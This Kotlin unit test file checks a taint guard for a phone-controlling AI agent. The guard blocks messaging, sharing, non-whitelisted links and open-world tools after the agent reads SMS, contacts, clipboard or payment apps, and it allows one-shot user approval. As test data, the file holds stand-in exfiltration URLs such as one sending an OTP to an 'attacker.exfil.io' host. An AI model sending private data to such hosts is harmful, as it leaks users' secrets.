package com.hana.agent.core.guard

import com.hana.agent.core.risk.IrrevAction
import com.hana.agent.core.tool.Verb
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertThrows
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test

class TaintGuardTest {

    private lateinit var guard: TaintGuard

    @Before
    fun setUp() {
        guard = TaintGuard(
            whitelistedDomains = setOf("hana.local", "trusted.example.com"),
            whitelistedSchemes = setOf("about"),
            whitelistedAppPackages = setOf("com.trusted.reader"),
        )
    }

    @Test
    fun cleanSessionAllowsOutboundActions() {
        val shareReq = OutboundActionRequest(
            sessionId = "s-clean",
            toolName = "phone_share_text",
            verb = Verb.ShareText,
            args = buildJsonObject { put("package", "com.tencent.mm"); put("text", "hello") },
        )
        assertEquals(TaintCheckOutcome.Allowed, guard.checkOutbound(shareReq))

        val urlReq = OutboundActionRequest(
            sessionId = "s-clean",
            toolName = "phone_open_link",
            verb = Verb.OpenLink,
            args = buildJsonObject { put("uri", "https://evil.example.org/collect"); put("package", "com.android.chrome") },
        )
        assertEquals(TaintCheckOutcome.Allowed, guard.checkOutbound(urlReq))
    }

    @Test
    fun readingClipboardContactsSmsNotificationsAndSensitiveAppsTaintsSession() {
        val s1 = guard.observeRead("s1", "read_clipboard")
        assertTrue(TaintSource.CLIPBOARD in s1)

        val s2 = guard.observeRead("s2", "phone_observe", packageName = "com.android.contacts")
        assertTrue(TaintSource.CONTACTS in s2)

        val s3 = guard.observeRead("s3", "phone_observe", packageName = "com.android.mms")
        assertTrue(TaintSource.SMS in s3)
        assertTrue(TaintSource.SENSITIVE_APP in s3)

        val s4 = guard.observeRead(
            "s4",
            "phone_event",
            args = buildJsonObject { put("kind", "notification") },
        )
        assertTrue(TaintSource.NOTIFICATION in s4)

        val s5 = guard.observeRead("s5", "phone_observe", packageName = "com.eg.android.AlipayGphone")
        assertTrue(TaintSource.SENSITIVE_APP in s5)
        assertTrue(guard.session("s5").isTainted)
    }

    @Test
    fun taintedSessionBlocksSendShareNonWhitelistUrlAndOpenWorldMcp() {
        val sid = "s-tainted"
        guard.recordPrivacyRead(sid, TaintSource.SMS, "读取到验证码短信", "com.android.mms")

        // 1. 发消息拦截
        val sendOutcome = guard.checkOutbound(
            OutboundActionRequest(
                sessionId = sid,
                toolName = "phone_tap",
                verb = Verb.Tap,
                currentPackage = "com.tencent.mm",
                irrevAction = IrrevAction.send,
            )
        )
        assertTrue(sendOutcome is TaintCheckOutcome.Blocked)
        val sendBlock = (sendOutcome as TaintCheckOutcome.Blocked).block
        assertEquals(OutboundActionKind.SEND_MESSAGE, sendBlock.actionKind)
        assertTrue(TaintSource.SMS in sendBlock.taintSources)
        assertTrue(sendBlock.requiresExplicitConfirmation)

        // 2. 跨应用分享拦截
        val shareOutcome = guard.checkOutbound(
            OutboundActionRequest(
                sessionId = sid,
                toolName = "phone_share_text",
                verb = Verb.ShareText,
                args = buildJsonObject { put("package", "com.example.other") },
            )
        )
        assertTrue(shareOutcome is TaintCheckOutcome.Blocked)
        assertEquals(OutboundActionKind.SHARE, (shareOutcome as TaintCheckOutcome.Blocked).block.actionKind)

        // 3. 非白名单 URL 拦截（以及 enforceOrThrow 异常抛出）
        val urlReq = OutboundActionRequest(
            sessionId = sid,
            toolName = "phone_open_link",
            verb = Verb.OpenLink,
            args = buildJsonObject { put("uri", "https://attacker.exfil.io/leak?otp=1234") },
        )
        val ex = assertThrows(TaintBlockedException::class.java) {
            guard.enforceOrThrow(urlReq)
        }
        assertEquals(OutboundActionKind.OPEN_NON_WHITELIST_URL, ex.block.actionKind)
        assertTrue(ex.block.toUserPrompt().contains("短信"))

        // 4. 开放世界 MCP 工具拦截
        val mcpReq = OutboundActionRequest(
            sessionId = sid,
            toolName = "mcp_webhook__post_note",
            verb = Verb.Interact,
            isOpenWorldMcp = true,
        )
        val mcpOutcome = guard.checkOutbound(mcpReq)
        assertTrue(mcpOutcome is TaintCheckOutcome.Blocked)
        assertEquals(OutboundActionKind.OPEN_WORLD_MCP, (mcpOutcome as TaintCheckOutcome.Blocked).block.actionKind)
    }

    @Test
    fun whitelistedUrlsAndSettingsActionsRemainAllowedEvenWhenTainted() {
        val sid = "s-whitelist"
        guard.recordPrivacyRead(sid, TaintSource.CLIPBOARD, "read clipboard")

        // 精确白名单域名、子域名、localhost 均放行
        assertEquals(
            TaintCheckOutcome.Allowed,
            guard.checkOutbound(
                OutboundActionRequest(
                    sessionId = sid,
                    toolName = "phone_open_link",
                    verb = Verb.OpenLink,
                    args = buildJsonObject { put("uri", "https://api.trusted.example.com/status") },
                )
            )
        )
        assertEquals(
            TaintCheckOutcome.Allowed,
            guard.checkOutbound(
                OutboundActionRequest(
                    sessionId = sid,
                    toolName = "web_navigate",
                    verb = Verb.Navigate,
                    args = buildJsonObject { put("url", "http://127.0.0.1:8080/health") },
                )
            )
        )
        // 本地系统设置页不属于外发
        assertEquals(
            TaintCheckOutcome.Allowed,
            guard.checkOutbound(
                OutboundActionRequest(
                    sessionId = sid,
                    toolName = "phone_open_link",
                    verb = Verb.OpenLink,
                    args = buildJsonObject { put("action", "android.settings.WIFI_SETTINGS") },
                )
            )
        )
    }

    @Test
    fun explicitOneShotAuthorizationUnblocksOnceAndIsConsumed() {
        val sid = "s-auth"
        guard.recordPrivacyRead(sid, TaintSource.CONTACTS, "读取通讯录")

        val req = OutboundActionRequest(
            sessionId = sid,
            toolName = "phone_open_link",
            verb = Verb.OpenLink,
            args = buildJsonObject { put("uri", "https://external.partner.org/share") },
        )

        val first = guard.checkOutbound(req) as TaintCheckOutcome.Blocked
        assertNotNull(first.block.approvalToken)

        // 用户确认该拦截令牌后，带令牌放行一次
        guard.authorizeByToken(sid, first.block.approvalToken)
        assertEquals(TaintCheckOutcome.Allowed, guard.checkOutbound(req.copy(approvalToken = first.block.approvalToken)))

        // 令牌已被消费，再次请求必须重新拦截
        val third = guard.checkOutbound(req.copy(approvalToken = first.block.approvalToken))
        assertTrue(third is TaintCheckOutcome.Blocked)
    }

    @Test
    fun sessionsAreIsolatedAndCanBeCleared() {
        guard.recordPrivacyRead("s-a", TaintSource.CLIPBOARD, "secret")
        assertTrue(guard.session("s-a").isTainted)
        assertFalse(guard.session("s-b").isTainted)

        val reqB = OutboundActionRequest("s-b", "phone_share_text", Verb.ShareText)
        assertEquals(TaintCheckOutcome.Allowed, guard.checkOutbound(reqB))

        guard.clearSession("s-a")
        val reqA = OutboundActionRequest("s-a", "phone_share_text", Verb.ShareText)
        assertEquals(TaintCheckOutcome.Allowed, guard.checkOutbound(reqA))
    }
}
